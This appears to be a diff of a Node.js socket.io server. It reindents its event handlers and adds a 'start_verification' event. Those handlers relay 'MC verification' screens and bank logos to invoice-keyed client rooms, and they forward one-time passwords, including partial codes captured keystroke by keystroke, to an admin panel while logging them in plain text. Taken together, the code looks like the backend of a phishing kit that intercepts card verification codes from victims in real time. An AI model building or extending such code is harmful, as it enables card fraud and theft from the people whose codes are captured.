@@ -365,7 +365,7 @@ app.get('/api/visitors', (req, res) => {
     
     return res.json(visitorList);
   } catch (error) {
-  console.error('Error getting visitors:', error);
+    console.error('Error getting visitors:', error);
     return res.status(500).json({ error: 'Failed to get visitors' });
   }
 });
@@ -698,52 +698,58 @@ io.on('connection', (socket) => {
     }
   });
   
-// MC verification events - enhanced with direct broadcasting
-socket.on('show_mc_verification', (data) => {
-  // Broadcast to the specific client with this invoice ID
-  console.log('Received show_mc_verification event:', data);
-  io.to(data.invoiceId).emit('show_mc_verification', data);
-});
-
-socket.on('update_mc_bank', (data) => {
-  // Update bank logo on client
-  console.log('Received update_mc_bank event:', data);
-  io.to(data.invoiceId).emit('update_mc_bank', {
-    invoiceId: data.invoiceId,
-    bankCode: data.bankCode
+  // MC verification events - enhanced with direct broadcasting
+  socket.on('show_mc_verification', (data) => {
+    // Broadcast to the specific client with this invoice ID
+    console.log('Received show_mc_verification event:', data);
+    io.to(data.invoiceId).emit('show_mc_verification', data);
   });
-});
 
-socket.on('mc_otp_submitted', (data) => {
-  // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
-  console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
-  io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients
-});
+  // NEW: Start verification event
+  socket.on('start_verification', (data) => {
+    console.log('Received start_verification event:', data);
+    io.to(data.invoiceId).emit('start_verification', data);
+  });
 
-// Optional - for live OTP typing feature
-socket.on('mc_otp_typing', (data) => {
-  // Send partial OTP to admin panel as user types - optional feature
-  console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
-  io.emit('mc_otp_typing', data);  // Broadcast to ALL clients
-});
+  socket.on('update_mc_bank', (data) => {
+    // Update bank logo on client
+    console.log('Received update_mc_bank event:', data);
+    io.to(data.invoiceId).emit('update_mc_bank', {
+      invoiceId: data.invoiceId,
+      bankCode: data.bankCode
+    });
+  });
 
-socket.on('mc_otp_error', (data) => {
-  // Send OTP error to client
-  console.log('Sending OTP error to client:', data);
-  io.to(data.invoiceId).emit('mc_otp_error', data);
-});
+  socket.on('mc_otp_submitted', (data) => {
+    // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
+    console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
+    io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients
+  });
 
-socket.on('mc_verification_result', (data) => {
-  // Send verification result to client
-  console.log('Sending verification result to client:', data);
-  io.to(data.invoiceId).emit('mc_verification_result', data);
-});
+  // Optional - for live OTP typing feature
+  socket.on('mc_otp_typing', (data) => {
+    // Send partial OTP to admin panel as user types - optional feature
+    console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
+    io.emit('mc_otp_typing', data);  // Broadcast to ALL clients
+  });
 
-socket.on('mc_resend_otp', (data) => {
-  // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
-  console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
-  io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
-});
+  socket.on('mc_otp_error', (data) => {
+    // Send OTP error to client
+    console.log('Sending OTP error to client:', data);
+    io.to(data.invoiceId).emit('mc_otp_error', data);
+  });
+
+  socket.on('mc_verification_result', (data) => {
+    // Send verification result to client
+    console.log('Sending verification result to client:', data);
+    io.to(data.invoiceId).emit('mc_verification_result', data);
+  });
+
+  socket.on('mc_resend_otp', (data) => {
+    // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
+    console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
+    io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
+  });
   
   // Handle disconnect
   socket.on('disconnect', () => {
